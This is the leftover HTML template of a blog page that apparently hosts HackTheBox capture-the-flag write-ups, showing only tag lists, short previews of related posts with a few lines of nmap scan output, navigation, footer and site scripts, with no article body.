  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag" href="/tags/active-directory/">active directory</a>
      
        
        <a class="post-tag" href="/tags/easy/">easy</a>
      
        
        <a class="post-tag" href="/tags/hacks/">hacks</a>
      
        
        <a class="post-tag" href="/tags/hard/">hard</a>
      
        
        <a class="post-tag" href="/tags/linux/">linux</a>
      
        
        <a class="post-tag" href="/tags/ldap/">ldap</a>
      
        
        <a class="post-tag" href="/tags/tryhackme/">tryhackme</a>
      
        
        <a class="post-tag" href="/tags/windows/">windows</a>
      
        
        <a class="post-tag" href="/tags/bloodhound/">bloodhound</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  
    <!-- BS-toc.js will be loaded at medium priority -->
    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
      <span class="pl-3 pt-2 mb-2">Contents</span>
      <nav id="toc" data-toggle="toc"></nav>
    </div>
  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/Intelligence/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->






<span class="timeago small"
  >Dec  4, 2021<i class="unloaded">2021-12-04T05:30:00+05:30</i>
</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Intelligence HTB</h3>
            <div class="text-muted small">
              <p>
                





                Nmap Scan
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/BountyHunter/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->






<span class="timeago small"
  >Nov 22, 2021<i class="unloaded">2021-11-22T05:30:00+05:30</i>
</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>BountyHunter HTB</h3>
            <div class="text-muted small">
              <p>
                





                BountyHunter



Fairly Easy box with a knowledge of XXE and reversing python scripts.


  Nmap
  Recon
  XXE Injection
  FootHold
  Root Privilege Escalation


As usual let’s start with nmap

Nmap
...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/Pikaboo/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->






<span class="timeago small"
  >Dec  4, 2021<i class="unloaded">2021-12-04T05:30:00+05:30</i>
</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Pikaboo HTB</h3>
            <div class="text-muted small">
              <p>
                





                

A very tough box with a good knowlege of webservers and perl scripting and a bit of code workthrough.


  Nmap
  Recon
  Nginx/Apache Misconfiguration
  FootHold
  User escalation
  Root Privileg...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/Pikaboo/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Pikaboo HTB</p>
  </a>
  

  
  <a href="/posts/Previse/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Previse HTB</p>
  </a>
  

</div>


    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2022
        <a href="https://twitter.com/t1nyb0y">tinyb0y</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        

        

        Powered by 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
         with 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
         theme.

      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag" href="/tags/active-directory/">active directory</a>
      
        
        <a class="post-tag" href="/tags/easy/">easy</a>
      
        
        <a class="post-tag" href="/tags/hacks/">hacks</a>
      
        
        <a class="post-tag" href="/tags/hard/">hard</a>
      
        
        <a class="post-tag" href="/tags/linux/">linux</a>
      
        
        <a class="post-tag" href="/tags/ldap/">ldap</a>
      
        
        <a class="post-tag" href="/tags/tryhackme/">tryhackme</a>
      
        
        <a class="post-tag" href="/tags/windows/">windows</a>
      
        
        <a class="post-tag" href="/tags/bloodhound/">bloodhound</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    
      <!--
  mermaid-js loader
-->

<script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script>
<script>
  $(function() {
    let initTheme = "default";

    if ($("html[mode=dark]").length > 0
      || ($("html[mode]").length == 0
        && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) {
      initTheme = "dark";
    }

    let mermaidConf = {
      theme: initTheme  /* <default|dark|forest|neutral> */
    };

    /* Markdown converts to HTML */
    $("pre").has("code.language-mermaid").each(function() {
      let svgCode = $(this).children().html();
      $(this).addClass("unloaded");
      $(this).after(`<div class=\"mermaid\">${svgCode}</div>`);
    });

    mermaid.initialize(mermaidConf);
  });
</script>

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="http://0.0.0.0:4000{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup -->
  <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>


  <!-- MathJax -->
  <script>
  /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */
  MathJax = {
    tex: {
      inlineMath: [              /* start/end delimiter pairs for in-line math */
        ['$','$'],
        ['\\(','\\)']
      ],
      displayMath: [             /* start/end delimiter pairs for display math */
        ['$$', '$$'],
        ['\\[', '\\]']
      ]
    }
  };
  </script>
  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
  <script type="text/javascript" id="MathJax-script" async
    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
  </script>


<!-- commons -->

<script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>




  </body>

</html>

